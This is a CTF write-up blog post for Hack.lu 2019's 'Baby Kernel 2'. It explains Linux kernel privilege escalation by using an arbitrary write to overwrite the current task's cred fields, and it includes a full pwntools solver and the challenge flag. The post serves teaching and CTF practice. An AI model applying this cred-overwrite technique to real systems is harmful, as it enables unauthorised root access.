---
layout: post
title: Intro to Kernel Pwning - Hack.lu 2019
date: 2019-11-03 19:54
summary: A great beginner Linux kernel pwn from Hack.lu 2019
categories:  CTF kernel linuk kernelpwn hacklu hack.lu
---

## Intro Kernel Pwn: Baby kernel 2 from [Hack.lu](https://fluxfingersforfuture.fluxfingers.net/challenges) 2019 CTF

### Challenge Summary:

Baby Kernel 2 is the second step in a series of intro kernel pwning challenges, beginning with last year's Hack.lu Baby Kernel 1. This year we are given a kernel that when ran, presents us with the following options:
1. Read from a memory address
2. Write to a memory address
3. Get our UID
4. Read a file

![kernel menu](/images/baby_kernel_2-menu.png)

Given the information we have thus far, we can assume that we need a way to gain elevated privilidges in order to read some file… maybe a flag file… ( •͡˘ _•͡˘).

### Further Analysis:

After unpacking the init file system and dumping the baby_kernel_2.ko module into a decompiler, you’ll notice that we are given a free 8-byte write anywhere in kernel land. This is triggered when using the write option in the menu.

To further understand this challenge, we must also recognize that we have System.map. The symbol table contains all of the kernel’s symbol names and their addresses. Symbols provide names of important information in a binary (functions, variables, etc.) and map these names to their location in memory. In this case, System.map provides us with the symbols for vmlinux. Most notably, current_task.

`current_task`(also referred to as `current`) is a pointer to the current executing task's [`task_struct`](http://140.120.7.21/LinuxRef/ProcMana/ProcessManaging.html). The kernel refrences each task using its task_struct. The task struct contains information about a process like its credentials and memory layout. We are specifically interested in the current process' [`cred_struct`](https://github.com/torvalds/linux/blob/master/include/linux/cred.h). If we can overwrite the current process' `cred_struct` to elevate its privilidges to root, we can read any file.

{% highlight c %}
struct task_struct {
    ...
	/* Process credentials: */

	/* Tracer's credentials at attach: */
	const struct cred __rcu		*ptracer_cred;

	/* Objective and real subjective task credentials (COW): */
	const struct cred __rcu		*real_cred;

	/* Effective (overridable) subjective task credentials (COW): */
	const struct cred __rcu		*cred;
	...
{% endhighlight %}

{% highlight c %}
struct cred {
	...
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	...
{% endhighlight %}

Every `task_Struct` contains a pointer to the processes's `cred_struct`. In order to accomplish overwriting the current processes's creds with our 8 byte write, we need to know the offset of the `cred_struct` in the `task_struct`. Once we know the address of the `cred_struct` we can get the offset of the privilidge ID's and overwrite them. We can figure out the offsets using a little gdbfoo:

```
(gdb) ptype /o struct task_struct
...
/* 1008      |     8 */    const struct cred *ptracer_cred;
/* 1016      |     8 */    const struct cred *real_cred;
/* 1024      |     8 */    const struct cred *cred;
...
```

```
(gdb) ptype /o struct cred
/* offset    |  size */  type = struct cred {
/*    0      |     4 */    atomic_t usage;
/*    4      |     4 */    kuid_t uid;
/*    8      |     4 */    kgid_t gid;
/*   12      |     4 */    kuid_t suid;
/*   16      |     4 */    kgid_t sgid;
/*   20      |     4 */    kuid_t euid;
/*   24      |     4 */    kgid_t egid;
/*   28      |     4 */    kuid_t fsuid;
/*   32      |     4 */    kgid_t fsgid;
```

Now that we know all the offsets, is is trivial to overwrite the creds of the current process. For this challenge, I only needed to overwrite `fsuid` and `fsgid` in order to gain privs to read `flag`. Here is my complete solver:

{% highlight python %}
from pwn import *

conn = remote("babykernel2.forfuture.fluxfingers.net", 1337)

def read(addr):
    conn.sendlineafter('> ', str(1))
    conn.sendlineafter('> ', str(hex(addr)))
    resp = conn.recvuntil("---").split()[22]
    return resp

def write(addr, val):
    conn.sendlineafter("> ",str(2))
    conn.sendlineafter("> ",str(hex(addr)))
    conn.sendlineafter("> ",str(val))
    return

def show_flag():
    conn.sendlineafter("> ",str(4))
    conn.sendlineafter("> ","flag")
    print(conn.recvuntil("}"))

#The pointer to current_task struct from System.map stored at current_task
current_task_ptr = 0xffffffff8183a040
current_task = read(current_task_ptr) #address of task_struct
log.info("current_task struct: 0x%s" % current_task)

"""
(gdb) ptype /o struct task_struct
/* 1008      |     8 */    const struct cred *ptracer_cred;
/* 1016      |     8 */    const struct cred *real_cred;
/* 1024      |     8 */    const struct cred *cred;
"""

#Offset of cred_struct into task_struct obtained from gdb
cred_off = 1024 #ptype /o struct task 0x400
cred_struct_ptr = int(current_task, 16) + cred_off

#cred_struct location
cred_struct = int(read(cred_struct_ptr), 16)
log.info("cred_struct: 0x%x" % cred_struct)

"""
(gdb) ptype /o struct cred
/* offset    |  size */  type = struct cred {
/*    0      |     4 */    atomic_t usage;
/*    4      |     4 */    kuid_t uid;
/*    8      |     4 */    kgid_t gid;
/*   12      |     4 */    kuid_t suid;
/*   16      |     4 */    kgid_t sgid;
/*   20      |     4 */    kuid_t euid;
/*   24      |     4 */    kgid_t egid;
/*   28      |     4 */    kuid_t fsuid;
/*   32      |     4 */    kgid_t fsgid;
"""

#exploit part
log.info("Overwriting fsuid")
write(cred_struct+28, 0) #set fsuid = 0, 0 = root privilidges

log.info("Overwriting fsgid")
write(cred_struct+32, 0) #set fsgid = 0

show_flag()
{% endhighlight %}


## Summary

Overall, I thought this was a great intro kernel pwning challenge, and I would highly reccommend it to anyone wanting to try kernel pwning. The key to solving this challenge is knowing a bit about Linux kernel symbols and some GDB skills to obtain offsets. 

If you are using Ghidra you must update to a version >= 9.1. For some reason Ghidra releases below 9.1 cannot handle decompiling kernel modules.

Flag: flag{nicely_done_this_is_how_a_privesc_can_also_go}

Solver is on [github]()

### Creds
- [@Kallsyms](https://twitter.com/kallsyms)
- [@Hack.lu](https://twitter.com/hack_lu?lang=en)